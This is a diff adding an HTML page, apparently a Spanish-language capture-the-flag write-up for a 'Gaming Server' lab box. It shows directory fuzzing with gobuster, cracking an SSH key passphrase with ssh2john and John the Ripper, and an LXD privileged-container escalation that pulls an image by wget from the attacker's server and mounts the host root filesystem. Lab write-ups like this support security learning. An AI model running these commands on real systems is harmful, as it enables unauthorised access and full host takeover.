@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gaming Server Report</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+        }
+
+        h1 {
+            color: #0047ab;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+
+        a {
+            color: blue;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div style="margin-left: 20%; margin-right: 20%;">
+        <h1>NMAP</h1>
+        <img src="image.png" alt="NMAP Scan Result">
+
+        <h1>WEB</h1>
+        <img src="image-1.png" alt="Web Interface Initial">
+        <p>Posible usuario:</p>
+        <img src="image-2.png" alt="Web Interface User Found">
+
+        <h1>Fuzzing</h1>
+        <p>Usamos Gobuster para decubrir directorios:</p>
+        <pre><code>gobuster dir -u http://10.10.74.161/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
+        <img src="image-3.png" alt="Gobuster Initial Result">
+        <img src="image-4.png" alt="Gobuster Process">
+        <img src="image-5.png" alt="Gobuster Process Continued">
+        <img src="image-6.png" alt="Gobuster Further Results">
+        <img src="image-7.png" alt="Gobuster Final Results">
+        <p>Convertimos la clave privada SSH para John The Ripper:</p>
+        <pre><code>ssh2john secretKey > pass.hash</code></pre>
+        <img src="image-8.png" alt="SSH Key Conversion">
+        <p>Crackeamos el hash con John The Ripper:</p>
+        <pre><code>john pass.hash</code></pre>
+        <img src="image-9.png" alt="John The Ripper Output">
+        <p>Colocamos los permisos necesarios para la SSH key:</p>
+        <pre><code>chmod 600 secretKey</code></pre>
+
+        <h1>SSH</h1>
+        <img src="image-10.png" alt="SSH Connection">
+
+        <h1>User Flag</h1>
+        <img src="image-11.png" alt="User Flag Found">
+
+        <h1>Privilege Escalation</h1>
+        <p>Descargar y usar Alpine Linux como contenedor para escalar privilegios:</p>
+        <p>Descargamos de <a href="https://github.com/saghul/lxd-alpine-builder/blob/master/build-alpine">build-alpine</a> y ejecutamos:</p>
+        <pre><code>sudo bash build-alpine</code></pre>
+        <p>Transfiera la imagen del contenedor a través de un servidor HTTP Python:</p>
+        <pre><code>wget 10.8.67.209:8001/alpine-v3.13-x86_64-20210218_0139.tar.gz</code></pre>
+        <img src="image-12.png" alt="Downloading Alpine Image">
+        <pre><code>lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage</code></pre>
+        <pre><code>lxc init alpine privesc -c security.privileged=true</code></pre>
+        <img src="image-13.png" alt="LXC Container Setup">
+        <p>Configurando e iniciando el contenedor:</p>
+        <pre><code>lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code></pre>
+        <pre><code>lxc start privesc</code></pre>
+        <pre><code>lxc exec privesc /bin/sh</code></pre>
+        <img src="image-14.png" alt="LXC Privilege Escalation">
+
+        <h1>Root Flag</h1>
+        <pre><code>find / -type f -name "root.txt" 2>/dev/null</code></pre>
+        <img src="image-15.png" alt="Root Flag Found">
+    </div>
+</body>
+</html>
+
